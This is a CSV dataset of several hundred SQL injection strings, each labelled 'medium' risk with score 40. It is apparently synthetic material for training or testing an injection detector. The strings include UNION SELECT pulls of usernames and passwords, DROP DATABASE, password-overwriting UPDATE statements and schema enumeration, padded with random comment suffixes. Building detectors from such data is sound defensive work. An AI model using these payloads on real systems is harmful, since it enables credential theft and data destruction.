query,risk,score
' OR username LIKE '%admin%' -- /**/ /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1 -- ",medium,40
'; SELECT COUNT(*) FROM users -- /**/ -- z,medium,40
'; DROP DATABASE temp -- OR 1=1 # ,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 # ,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # h2,medium,40
' HAVING 1=1 # # gwkti86,medium,40
' OR username LIKE '%admin%' -- -- m0s8x9,medium,40
' UNION SELECT * FROM information_schema.tables -- # 9nm9lti,medium,40
'; DROP DATABASE temp -- /**/ /**/,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # e8ad348",medium,40
'; DROP DATABASE temp -- -- ags5rr,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ -- m",medium,40
' or 1=1 in (select * from users) -- # 05g6k6b,medium,40
'; DROP DATABASE temp -- LIMIT 1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # o4,medium,40
' OR username LIKE '%admin%' -- OR 1=1 # ,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ofwg9s",medium,40
'; DROP DATABASE temp -- -- z2i5ks,medium,40
'; SELECT @@version -- LIMIT 1 -- ,medium,40
'; DROP DATABASE temp -- # 03ukl1b,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ -- 1,medium,40
"' UNION SELECT username, password FROM users -- -- t969g3",medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ -- q,medium,40
' HAVING 1=1 # OR 1=1 # ,medium,40
"' UNION SELECT username, password FROM users -- # cjz46t5",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ -- d",medium,40
' OR username LIKE '%admin%' -- OR 1=1 # ,medium,40
'; DROP DATABASE temp -- AND 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- /**/ /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1 -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- twuur1",medium,40
'; SELECT @@version -- OR 1=1 # ,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1 -- ,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1 -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- # u4gjban,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1 -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # qdsebdb,medium,40
' HAVING 1=1 # # 24miqcy,medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- -- 32clmv",medium,40
' or 1=1 in (select * from users) -- /**/ /**/,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 # ,medium,40
'; UPDATE users SET password='pass' OR 1=1 # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 # ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1 -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ -- g,medium,40
"' UNION SELECT username, password FROM users -- # h2km2nu",medium,40
'; UPDATE users SET password='pass' /**/ -- 3,medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- LIMIT 1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 # ",medium,40
' OR username LIKE '%admin%' -- # 6j4vc67,medium,40
'; DROP DATABASE temp -- -- ey05ai,medium,40
'; DROP DATABASE temp -- /**/ -- o,medium,40
' OR username LIKE '%admin%' -- OR 1=1 # ,medium,40
' or 1=1 in (select * from users) -- # mgh1doi,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1 -- ",medium,40
' OR username LIKE '%admin%' -- # qfllmc4,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # 1s,medium,40
"' UNION SELECT username, password FROM users -- # pmyexc5",medium,40
'; DROP DATABASE temp -- AND 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # ff3kxox",medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1 -- ,medium,40
' OR username LIKE '%admin%' -- /**/ # lf,medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- LIMIT 1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 # ",medium,40
' or 1=1 in (select * from users) -- -- cwkyk3,medium,40
' or 1 = 1 LIMIT 1 -- -- w07l03,medium,40
'; UPDATE users SET password='pass' # og7sso1,medium,40
' or 1=1 in (select * from users) -- # i34ydhe,medium,40
'; DROP DATABASE temp -- LIMIT 1 -- ,medium,40
'; SELECT @@version -- LIMIT 1 -- ,medium,40
' HAVING 1=1 # /**/ # wj,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1 -- ",medium,40
' OR username LIKE '%admin%' -- -- 8smwmd,medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 # ,medium,40
' or 1=1 in (select * from users) -- OR 1=1 # ,medium,40
'; DROP DATABASE temp -- AND 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- /**/ -- 0",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ -- 2",medium,40
' OR username LIKE '%admin%' -- LIMIT 1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 5utcvb,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- # k3tkw9t,medium,40
' or 1=1 in (select * from users) -- -- genx1h,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 # ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1 -- ",medium,40
' HAVING 1=1 # -- 3ky8rh,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 # ",medium,40
' HAVING 1=1 # LIMIT 1 -- ,medium,40
'; SELECT @@version -- AND 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1 -- ,medium,40
'; UPDATE users SET password='pass' OR 1=1 # ,medium,40
' or 1=1 in (select * from users) -- AND 1=1 -- ,medium,40
'; UPDATE users SET password='pass' LIMIT 1 -- ,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 8ll16a7",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
'; UPDATE users SET password='pass' -- n4pk01,medium,40
"' UNION SELECT username, password FROM users -- -- v90vt0",medium,40
'; SELECT @@version -- /**/ /**/,medium,40
"' UNION SELECT username, password FROM users -- -- nfi1wv",medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1 -- ,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1 -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1 -- ,medium,40
'; UPDATE users SET password='pass' # nt5jnvb,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1 -- ,medium,40
' OR username LIKE '%admin%' -- OR 1=1 # ,medium,40
' HAVING 1=1 # -- dbab5a,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 6ad7m8",medium,40
' HAVING 1=1 # -- lprr2v,medium,40
' OR username LIKE '%admin%' -- OR 1=1 # ,medium,40
'; SELECT COUNT(*) FROM users -- /**/ -- b,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 0g1bxh",medium,40
'; DROP DATABASE temp -- # h4p8y8v,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1 -- ",medium,40
'; DROP DATABASE temp -- /**/ -- d,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- jkwv4j,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 4dzmca",medium,40
' or 1 = 1 LIMIT 1 -- # etplx7r,medium,40
' or 1=1 in (select * from users) -- LIMIT 1 -- ,medium,40
' or 1=1 in (select * from users) -- LIMIT 1 -- ,medium,40
' or 1=1 in (select * from users) -- -- m5c0is,medium,40
'; DROP DATABASE temp -- LIMIT 1 -- ,medium,40
'; UPDATE users SET password='pass' AND 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1 -- ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # zn",medium,40
'; SELECT @@version -- # io12z4h,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1 -- ",medium,40
'; UPDATE users SET password='pass' OR 1=1 # ,medium,40
' or 1=1 in (select * from users) -- LIMIT 1 -- ,medium,40
' HAVING 1=1 # /**/ # tg,medium,40
'; DROP DATABASE temp -- # xh4poxk,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # qt3sj0b",medium,40
'; UPDATE users SET password='pass' OR 1=1 # ,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 # ,medium,40
'; SELECT @@version -- AND 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- /**/ # 9v,medium,40
'; SELECT @@version -- # 4wlznxb,medium,40
"' UNION SELECT username, password FROM users -- # gsfyw03",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1 -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # s5w47py",medium,40
'; SELECT COUNT(*) FROM users -- # novq50x,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 3aqspl",medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ /**/",medium,40
1' OR 1=1; SELECT * FROM users -- # u6rgqec,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1 -- ,medium,40
' or 1=1 in (select * from users) -- OR 1=1 # ,medium,40
'; SELECT @@version -- LIMIT 1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # cy,medium,40
'; SELECT @@version -- OR 1=1 # ,medium,40
' or 1 = 1 LIMIT 1 -- # 625ino1,medium,40
'; UPDATE users SET password='pass' -- 804z3v,medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1 -- ",medium,40
' or 1=1 in (select * from users) -- AND 1=1 -- ,medium,40
'; SELECT @@version -- -- ivfgjh,medium,40
' UNION SELECT * FROM information_schema.tables -- -- qceikt,medium,40
' or 1=1 in (select * from users) -- /**/ # a0,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # zn",medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 5k2v7z,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ajdhtb",medium,40
'; SELECT COUNT(*) FROM users -- /**/ # kc,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 # ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 # ",medium,40
'; UPDATE users SET password='pass' -- 8jt104,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- bnn83g",medium,40
' HAVING 1=1 # -- ktmoxj,medium,40
' HAVING 1=1 # # dm0p9xf,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1 -- ",medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1 -- ,medium,40
'; SELECT @@version -- # 1umadlo,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1 -- ",medium,40
' or 1=1 in (select * from users) -- AND 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- -- 85xhy2,medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ /**/",medium,40
1' OR 1=1; SELECT * FROM users -- -- wrm1tv,medium,40
"' UNION SELECT username, password FROM users -- /**/ # re",medium,40
' or 1=1 in (select * from users) -- /**/ -- d,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 3dsh5x5",medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # j55f0m8,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # mh20yfy",medium,40
'; SELECT COUNT(*) FROM users -- -- nofhfg,medium,40
"' UNION SELECT username, password FROM users -- # dmu7hpa",medium,40
' or 1=1 in (select * from users) -- -- 9o8vhf,medium,40
' HAVING 1=1 # # iy5evn2,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1 -- ",medium,40
' or 1 = 1 LIMIT 1 -- # tfjynss,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 # ,medium,40
' HAVING 1=1 # OR 1=1 # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ /**/,medium,40
"' UNION SELECT username, password FROM users -- /**/ /**/",medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 # ",medium,40
"' UNION SELECT username, password FROM users -- -- 05hbox",medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1 -- ,medium,40
'; SELECT @@version -- -- 3we59n,medium,40
' HAVING 1=1 # OR 1=1 # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1 -- ",medium,40
1' OR 1=1; SELECT * FROM users -- # dfaj4jb,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1 -- ",medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1 -- ,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ -- 4",medium,40
'; UPDATE users SET password='pass' # d34e3ri,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # n9sb34u",medium,40
' or 1 = 1 LIMIT 1 -- # lxjkfcn,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 9olcnz",medium,40
"' UNION SELECT username, password FROM users -- AND 1=1 -- ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 0iura2",medium,40
"' UNION SELECT username, password FROM users -- AND 1=1 -- ",medium,40
' or 1 = 1 LIMIT 1 -- -- 4jx6v5,medium,40
1' OR '1' = '1' GROUP BY 1 -- # f0da5me,medium,40
' HAVING 1=1 # AND 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1 -- ,medium,40
'; UPDATE users SET password='pass' OR 1=1 # ,medium,40
' or 1 = 1 LIMIT 1 -- /**/ # dt,medium,40
' HAVING 1=1 # LIMIT 1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1 -- ,medium,40
'; DROP DATABASE temp -- OR 1=1 # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # d46c6pk",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # nvzb956",medium,40
'; SELECT @@version -- /**/ # ad,medium,40
'; UPDATE users SET password='pass' AND 1=1 -- ,medium,40
'; UPDATE users SET password='pass' LIMIT 1 -- ,medium,40
'; DROP DATABASE temp -- AND 1=1 -- ,medium,40
' HAVING 1=1 # LIMIT 1 -- ,medium,40
'; SELECT @@version -- -- mu25h4,medium,40
' or 1=1 in (select * from users) -- AND 1=1 -- ,medium,40
'; SELECT @@version -- LIMIT 1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1 -- ",medium,40
' HAVING 1=1 # /**/ /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # s8",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # 7o,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
'; SELECT @@version -- # jd8yefc,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # cljjbcl",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- a1ridr",medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1 -- ,medium,40
' HAVING 1=1 # -- zoqwc9,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # f7v21fd",medium,40
'; SELECT @@version -- /**/ /**/,medium,40
' HAVING 1=1 # /**/ -- 4,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1 -- ",medium,40
'; UPDATE users SET password='pass' LIMIT 1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- suz909,medium,40
'; SELECT COUNT(*) FROM users -- -- rdk5mg,medium,40
' OR username LIKE '%admin%' -- /**/ # un,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1 -- ,medium,40
' OR username LIKE '%admin%' -- # 9mybtk3,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ -- z",medium,40
'; UPDATE users SET password='pass' AND 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1 -- ,medium,40
'; UPDATE users SET password='pass' /**/ -- r,medium,40
' or 1=1 in (select * from users) -- -- swe34d,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- /**/ /**/",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- # ae0g4im,medium,40
' or 1=1 in (select * from users) -- LIMIT 1 -- ,medium,40
' HAVING 1=1 # OR 1=1 # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1 -- ",medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1 -- ,medium,40
'; UPDATE users SET password='pass' -- gw2v3m,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 # ",medium,40
'; UPDATE users SET password='pass' -- 63w1qe,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ -- w",medium,40
' OR username LIKE '%admin%' -- /**/ -- z,medium,40
"' UNION SELECT username, password FROM users -- -- xyu5c3",medium,40
' OR username LIKE '%admin%' -- LIMIT 1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 7btijk5",medium,40
' or 1=1 in (select * from users) -- OR 1=1 # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # 1m",medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # vo",medium,40
' or 1=1 in (select * from users) -- # j745cub,medium,40
' OR username LIKE '%admin%' -- # vlv1kec,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 # ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 70e7j0",medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- # x3dxu1z,medium,40
'; SELECT @@version -- -- haut7i,medium,40
'; SELECT COUNT(*) FROM users -- # n11ovui,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- g3l4hu",medium,40
' OR username LIKE '%admin%' -- -- z9n608,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 # ",medium,40
' or 1 = 1 LIMIT 1 -- -- 3y851v,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # uvzf80i",medium,40
' OR username LIKE '%admin%' -- LIMIT 1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # 60386uz,medium,40
'; DROP DATABASE temp -- OR 1=1 # ,medium,40
' OR username LIKE '%admin%' -- OR 1=1 # ,medium,40
'; UPDATE users SET password='pass' LIMIT 1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ -- d",medium,40
' or 1=1 in (select * from users) -- -- y745aq,medium,40
' or 1=1 in (select * from users) -- /**/ -- o,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1 -- ",medium,40
' HAVING 1=1 # LIMIT 1 -- ,medium,40
'; SELECT @@version -- LIMIT 1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- /**/ # bu,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ -- n",medium,40
1' OR 1=1; SELECT * FROM users -- -- gaov32,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
' HAVING 1=1 # # wg3fsij,medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
'; SELECT @@version -- AND 1=1 -- ,medium,40
'; UPDATE users SET password='pass' OR 1=1 # ,medium,40
' OR username LIKE '%admin%' -- OR 1=1 # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # zn",medium,40
' or 1=1 in (select * from users) -- # ya7tqr8,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1 -- ",medium,40
' or 1=1 in (select * from users) -- AND 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 # ",medium,40
'; SELECT @@version -- # jqfk6zi,medium,40
' OR username LIKE '%admin%' -- -- fr33pr,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
"' UNION SELECT username, password FROM users -- -- c0o5x6",medium,40
'; DROP DATABASE temp -- OR 1=1 # ,medium,40
' HAVING 1=1 # # x9ffmin,medium,40
'; DROP DATABASE temp -- # yjeed5z,medium,40
"' UNION SELECT username, password FROM users -- # vs893zk",medium,40
'; DROP DATABASE temp -- LIMIT 1 -- ,medium,40
' OR username LIKE '%admin%' -- # b54whts,medium,40
'; UPDATE users SET password='pass' OR 1=1 # ,medium,40
'; SELECT COUNT(*) FROM users -- -- l6ixax,medium,40
"' UNION SELECT username, password FROM users -- /**/ /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # muybppn",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 17zqzvf",medium,40
' HAVING 1=1 # -- a224dh,medium,40
' or 1=1 in (select * from users) -- LIMIT 1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 # ",medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 # ,medium,40
1' OR 1=1; SELECT * FROM users -- /**/ # dx,medium,40
'; SELECT @@version -- # vw64nfe,medium,40
'; SELECT COUNT(*) FROM users -- # w2oo0xf,medium,40
'; DROP DATABASE temp -- # hizvf4t,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- knmeld,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ -- e,medium,40
' OR username LIKE '%admin%' -- # r6656cy,medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 90g6h5s",medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- /**/ -- x,medium,40
'; SELECT @@version -- # buhsyt8,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1 -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
' OR username LIKE '%admin%' -- OR 1=1 # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1 -- ",medium,40
' or 1 = 1 LIMIT 1 -- # q15msk0,medium,40
'; DROP DATABASE temp -- -- s4utck,medium,40
'; SELECT @@version -- /**/ # 5s,medium,40
' or 1 = 1 LIMIT 1 -- -- rtrsfu,medium,40
1' OR 1=1; SELECT * FROM users -- -- 98erng,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- # n6el122,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1 -- ,medium,40
'; SELECT @@version -- /**/ -- 1,medium,40
' or 1=1 in (select * from users) -- AND 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 # ",medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 # ,medium,40
'; SELECT @@version -- LIMIT 1 -- ,medium,40
'; DROP DATABASE temp -- LIMIT 1 -- ,medium,40
'; UPDATE users SET password='pass' -- 1xl82a,medium,40
'; UPDATE users SET password='pass' OR 1=1 # ,medium,40
'; DROP DATABASE temp -- /**/ -- n,medium,40
' or 1=1 in (select * from users) -- -- yfzcko,medium,40
'; SELECT @@version -- /**/ # lb,medium,40
' or 1 = 1 LIMIT 1 -- /**/ # td,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 681smo,medium,40
'; SELECT @@version -- -- 4gsekj,medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- /**/ /**/,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # rw,medium,40
' OR username LIKE '%admin%' -- LIMIT 1 -- ,medium,40
' HAVING 1=1 # -- uf6ik9,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ -- b",medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 # ",medium,40
' HAVING 1=1 # OR 1=1 # ,medium,40
'; SELECT COUNT(*) FROM users -- -- egtsln,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1 -- ",medium,40
' HAVING 1=1 # # wtj8vwc,medium,40
'; UPDATE users SET password='pass' # hdoaxt5,medium,40
'; DROP DATABASE temp -- LIMIT 1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- /**/ -- f,medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- OR 1=1 # ,medium,40
'; SELECT COUNT(*) FROM users -- /**/ -- r,medium,40
' OR username LIKE '%admin%' -- LIMIT 1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- pzxpqs",medium,40
' OR username LIKE '%admin%' -- OR 1=1 # ,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 # ,medium,40
'; UPDATE users SET password='pass' LIMIT 1 -- ,medium,40
"' UNION SELECT username, password FROM users -- # k5k9oeb",medium,40
' OR username LIKE '%admin%' -- OR 1=1 # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 0vrhqh,medium,40
'; DROP DATABASE temp -- -- 0szp2h,medium,40
'; SELECT @@version -- # 8k2kuas,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1 -- ,medium,40
' HAVING 1=1 # # mwn73q3,medium,40
